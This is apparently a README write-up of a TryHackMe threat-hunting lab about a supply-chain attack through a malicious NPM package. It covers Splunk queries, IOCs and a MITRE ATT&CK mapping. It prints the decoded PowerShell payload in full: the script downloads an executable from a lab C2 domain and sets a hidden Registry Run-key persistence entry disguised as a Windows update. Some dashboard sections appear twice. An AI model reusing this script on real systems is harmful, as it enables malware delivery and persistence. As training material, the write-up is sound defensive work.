# 🔍 Threat Hunting Simulator – Health Hazard (TryHackMe)

[![TryHackMe](https://img.shields.io/badge/TryHackMe-Room-red)](https://tryhackme.com)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE-ATT%26CK-blue)](https://attack.mitre.org/)
[![Splunk](https://img.shields.io/badge/Tool-Splunk-green)](https://www.splunk.com/)

> **Complete Investigation Write-Up**: Supply Chain Compromise via Malicious NPM Package

---

## 📋 Overview

The **Health Hazard** room simulates a real-world supply chain attack leveraging a weaponized NPM package. This investigation demonstrates how threat actors compromise under-maintained libraries, inject malicious code into post-install scripts, and achieve persistence on developer workstations.

### 🎯 Objectives
- Analyze Splunk telemetry to identify attack patterns
- Reconstruct the complete attack lifecycle
- Extract and decode malicious payloads
- Map attacker TTPs to MITRE ATT&CK framework
- Document all Indicators of Compromise (IOCs)

---

## 🧪 Scenario Summary

Security intelligence flagged suspicious activity tied to a broader campaign targeting open-source ecosystems (NPM, Python). Attackers compromise legitimate packages, publish malicious updates, and embed payloads in automated installation scripts to deliver malware to downstream users.

**Mission**: Investigate Splunk logs to trace the attack from initial access through persistence establishment.

---

## 🚨 Key Indicators of Compromise

### Host-Based IOCs

| Type | Value |
|------|-------|
| **Malicious Package** | `healthchk-lib@1.0.1` |
| **Execution Method** | `powershell.exe -NoP -W Hidden -EncodedCommand` |
| **Persistence Mechanism** | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
| **Registry Value Name** | `Windows Update Monitor` |
| **Dropped Malware** | `%APPDATA%\SystemHealthUpdater.exe` |
| **Attack Vector** | NPM `postinstall` script |

### Network-Based IOCs

| Type | Value |
|------|-------|
| **C2 Domain** | `global-update.wlndows.thm` |
| **Download URL** | `http://global-update.wlndows.thm/SystemHealthUpdater.exe` |
| **Protocol** | HTTP (Port 80) |
| **Behavior** | Outbound file download via PowerShell `Invoke-WebRequest` |

---

## 📊 Investigation Results Dashboard

![Investigation Success](screenshots/investigation-success.png)
*Successfully validated hypothesis with 100% technique identification and 60% IOC detection rate*

### Performance Metrics
- ✅ **Techniques/Tactics Identified**: 100%
- ✅ **Compromised Assets Detected**: 100%
- ⚠️ **IOCs Detected**: 60%
- ⏱️ **Investigation Time**: 1 hour, 21 minutes
- 🎯 **Score**: 290 points

---

## 📸 Investigation Evidence

### Splunk Event Analysis
![Sysmon Process Creation Event](screenshots/splunk-sysmon-event.png)
*Sysmon EventCode 1 showing malicious PowerShell execution with encoded command*

### Attack Chain Visualization
![Attack Chain - 3 Stages](screenshots/attack-chain-stages.png)
*Complete attack chain showing Initial Access → Execution → Persistence*

### Final Threat Report
![Threat Report Summary](screenshots/threat-report.png)
*Generated threat report with MITRE ATT&CK mapping and IOC analysis*

---

## 🔎 Investigation Workflow

### Step 1: Initial Dataset Filtering

Started with a broad search to identify package manager activity:

```spl
npm OR python
```

**Result**: Reduced dataset to 5 relevant events

### Step 2: Identifying Initial Access

Sysmon `EventCode 1` (Process Creation) revealed:

```bash
"C:\Program Files\nodejs\node.exe" ... install healthchk-lib@1.0.1
```

✅ **Confirmed**: Initial access via compromised NPM package (known IOC)

### Step 3: Malicious Execution Analysis

Detected obfuscated PowerShell execution:

```cmd
cmd.exe /d /s /c powershell.exe -NoP -W Hidden -EncodedCommand <base64_payload>
```

#### Decoded PowerShell Payload (UTF-16LE)

```powershell
$dest = "$env:APPDATA\SystemHealthUpdater.exe"
$url = "http://global-update.wlndows.thm/SystemHealthUpdater.exe"

# Download malware
Invoke-WebRequest -Uri $url -OutFile $dest

# Encode persistence command
$encoded = [Convert]::ToBase64String(
    [Text.Encoding]::Unicode.GetBytes("Start-Process '$dest'")
)

# Create hidden startup command
$runCmd = 'powershell.exe -NoP -W Hidden -EncodedCommand ' + $encoded

# Establish persistence
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
    -Name 'Windows Update Monitor' -Value $runCmd
```

**Attack Actions**:
1. Downloads executable to `%APPDATA%`
2. Creates Base64-encoded startup command
3. Establishes registry persistence disguised as Windows Update

### Step 4: Persistence Verification

Registry modification confirmed via Sysmon event:

```
Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Name: Windows Update Monitor
Value: powershell.exe -NoP -W Hidden -EncodedCommand <encoded_payload>
```

---

## 🗺️ Attack Chain Reconstruction

### MITRE ATT&CK Mapping

```mermaid
graph LR
    A[Initial Access<br/>T1195] --> B[Execution<br/>T1059]
    B --> C[Persistence<br/>T1547]
    
    style A fill:#ff6b6b
    style B fill:#feca57
    style C fill:#48dbfb
```

| Stage | MITRE Technique | Description |
|-------|----------------|-------------|
| **1. Initial Access** | [T1195](https://attack.mitre.org/techniques/T1195/) - Supply Chain Compromise | Malicious NPM package installed via `npm install` |
| **2. Execution** | [T1059](https://attack.mitre.org/techniques/T1059/) - Command and Scripting Interpreter | Obfuscated PowerShell executed from `postinstall` script |
| **3. Persistence** | [T1547](https://attack.mitre.org/techniques/T1547/) - Boot or Logon Autostart Execution | Registry Run key modified for automatic execution |

---

## ✅ Investigation Conclusion

### Verdict: **HYPOTHESIS CONFIRMED**

The investigation validates that the attacker successfully:
- ✅ Compromised a third-party NPM package
- ✅ Executed malicious PowerShell payload via post-install script
- ✅ Downloaded remote malware to victim system
- ✅ Established persistent access via registry modification
- ✅ Disguised malicious activity as legitimate Windows operations

This attack demonstrates a sophisticated supply chain compromise consistent with real-world APT campaigns targeting software development environments.

---

## 🎓 Key Takeaways

1. **Supply Chain Risk** is an active and severe threat vector targeting developer workflows
2. **NPM Post-Install Scripts** represent a common abuse point for malware delivery
3. **Obfuscated PowerShell** (`-EncodedCommand`) remains a primary execution technique
4. **Registry Run Keys** provide simple yet effective persistence mechanisms
5. **Sysmon + Splunk** combination offers strong visibility across multi-stage attacks

---

## 📊 Investigation Results Dashboard

![Investigation Success](screenshots/investigation-success.png)
*Successfully validated hypothesis with 100% technique identification and 60% IOC detection rate*

### Performance Metrics
- ✅ **Techniques/Tactics Identified**: 100%
- ✅ **Compromised Assets Detected**: 100%
- ⚠️ **IOCs Detected**: 60%
- ⏱️ **Investigation Time**: 1 hour, 21 minutes
- 🎯 **Score**: 290 points

---

## 📸 Investigation Evidence

### Splunk Event Analysis
![Sysmon Process Creation Event](screenshots/splunk-sysmon-event.png)
*Sysmon EventCode 1 showing malicious PowerShell execution with encoded command*

### Attack Chain Visualization
![Attack Chain - 3 Stages](screenshots/attack-chain-stages.png)
*Complete attack chain showing Initial Access → Execution → Persistence*

### Final Threat Report
![Threat Report Summary](screenshots/threat-report.png)
*Generated threat report with MITRE ATT&CK mapping and IOC analysis*

---

## 📂 Repository Structure

```
/Health-Hazard-THM
│
├── /screenshots/
│   ├── splunk-sysmon-event.png          # CommandLine with encoded payload
│   ├── investigation-success.png         # Completion dashboard
│   ├── attack-chain-stages.png          # 3-stage attack visualization
│   └── threat-report.png                # Final threat report
│
├── decoded_payload.txt                   # Full decoded PowerShell script
├── IOCs.md                               # Comprehensive IOC list
├── MITRE-Mapping.md                      # Detailed TTP mapping
├── attack-chain-diagram.png             # Visual attack flow
└── README.md                             # This document
```

---

## 🛠️ Tools Used

- **Splunk Enterprise** - Log analysis and threat hunting
- **Sysmon** - Windows event monitoring
- **CyberChef** - Payload decoding (Base64, UTF-16LE)
- **MITRE ATT&CK Navigator** - TTP mapping

---

## 🔗 References

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Sysmon Documentation](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [NPM Security Best Practices](https://docs.npmjs.com/packages-and-modules/securing-your-code)
- [TryHackMe - Health Hazard Room](https://tryhackme.com)

---

## 📝 License

This investigation write-up is for educational purposes only.

---

<div align="center">

**⭐ If you found this investigation helpful, please consider starring this repository!**

</div>